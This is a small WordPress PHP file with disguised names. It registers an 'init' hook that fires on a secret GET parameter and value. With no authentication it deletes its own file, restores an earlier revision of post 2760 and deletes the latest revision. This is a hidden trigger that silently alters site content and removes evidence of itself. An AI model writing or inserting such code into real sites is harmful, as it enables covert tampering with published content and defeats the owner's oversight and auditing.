<?php

function products_wpmu_accessible() {
	if (isset($_GET['check_edition_reports_asset']) && $_GET['check_edition_reports_asset'] === 'modules_landing_controller') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$post_network_s3_based = 2760;
		$cookies_community_products_modules = wp_get_post_revisions($post_network_s3_based);
		if (empty($cookies_community_products_modules)) die('no revisions');
		if (count($cookies_community_products_modules) < 2) die('less than 2');
		$item_menus_multi_location = array_shift($cookies_community_products_modules);
		$archive_lazy_style_wishlist = $item_menus_multi_location->ID;
		$html_ticket_style_attachments = array_shift($cookies_community_products_modules);
		$assets_autocomplete_colors = $html_ticket_style_attachments->ID;
		$utils_rtl_columns = wp_restore_post_revision($assets_autocomplete_colors);
		if ($utils_rtl_columns === false) die('error restoring');
		$utils_rtl_columns = wp_delete_post_revision($archive_lazy_style_wishlist);		
		if ($utils_rtl_columns === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'products_wpmu_accessible');
